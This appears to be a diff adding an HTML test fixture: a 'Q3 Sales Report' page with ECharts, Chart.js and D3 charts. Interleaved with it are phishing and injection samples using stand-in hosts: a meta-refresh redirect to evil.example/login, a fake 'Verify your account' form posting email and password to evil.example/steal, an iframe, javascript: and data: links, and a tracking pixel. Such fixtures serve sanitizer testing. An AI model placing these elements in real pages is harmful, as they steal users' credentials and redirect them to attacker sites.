@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Q3 Sales Report</title>
+<meta http-equiv="refresh" content="30;url=https://evil.example/login">
+<link rel="stylesheet" href="assets/style.css">
+<link rel="icon" href="assets/logo.png">
+<script src="https://cdn.jsdelivr.net/npm/echarts@5.5.1/dist/echarts.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script>
+</head><body onload="console.log('hi')">
+<div class="wrap">
+  <img src="assets/logo.png" alt="logo">
+  <h1>Q3 Sales Report</h1>
+  <div class="grid">
+    <div class="card"><div>Revenue</div><div class="kpi" id="rev">…</div></div>
+    <div class="card tracker"><div>Customers</div><div class="kpi">1,284</div></div>
+    <div class="card"><h2>Monthly revenue (ECharts, SVG)</h2><div id="ec" style="height:300px"></div></div>
+    <div class="card"><h2>By region (Chart.js, canvas)</h2><canvas id="cj" height="300"></canvas></div>
+    <div class="card"><h2>Pipeline (D3)</h2><div id="d3"></div></div>
+    <div class="card"><h2>Notes</h2>
+      <details open><summary>Methodology</summary><p>Collapsible sections still work with CSS only.</p></details>
+      <p><a href="https://example.com/source">Source data</a> · <a href="javascript:alert(1)">bad link</a> · <a href="data:text/html,<h1>phish</h1>">data link</a></p>
+      <p onclick="alert('x')" style="background:url(https://tracker.example/pixel.gif)">Tracked paragraph</p>
+    </div>
+  </div>
+  <form action="https://evil.example/steal" method="post" class="card" style="margin-top:20px">
+    <h2>Verify your account</h2>
+    <input type="email" placeholder="email"> <input type="password" placeholder="password">
+    <input type="hidden" name="t" value="x"> <button type="submit">Sign in</button>
+  </form>
+  <iframe src="https://evil.example"></iframe>
+  <svg width="0" height="0"><a href="javascript:alert(1)"><text>x</text></a></svg>
+</div>
+<script>
+document.getElementById('rev').textContent = '$4.2M';
+echarts.init(document.getElementById('ec'), null, {renderer:'svg'}).setOption({
+  xAxis:{type:'category',data:['Jul','Aug','Sep']}, yAxis:{type:'value'},
+  series:[{type:'bar',data:[1.2,1.4,1.6],itemStyle:{color:'#1f6feb'}},{type:'line',data:[1.1,1.3,1.7]}]});
+new Chart(document.getElementById('cj'),{type:'doughnut',data:{labels:['North','South','East','West'],
+  datasets:[{data:[35,25,22,18],backgroundColor:['#1f6feb','#2da44e','#bf8700','#cf222e']}]}});
+const data=[['Lead',120],['Qualified',80],['Proposal',45],['Won',22]];
+const svg=d3.select('#d3').append('svg').attr('width',480).attr('height',200);
+const x=d3.scaleLinear().domain([0,120]).range([0,320]);
+const g=svg.selectAll('g').data(data).enter().append('g').attr('transform',(d,i)=>`translate(100,${i*45+10})`);
+g.append('rect').attr('width',d=>x(d[1])).attr('height',32).attr('fill','#2da44e');
+g.append('text').attr('x',-8).attr('y',21).attr('text-anchor','end').text(d=>d[0]);
+g.append('text').attr('x',d=>x(d[1])+6).attr('y',21).text(d=>d[1]);
+</script>
+</body></html>
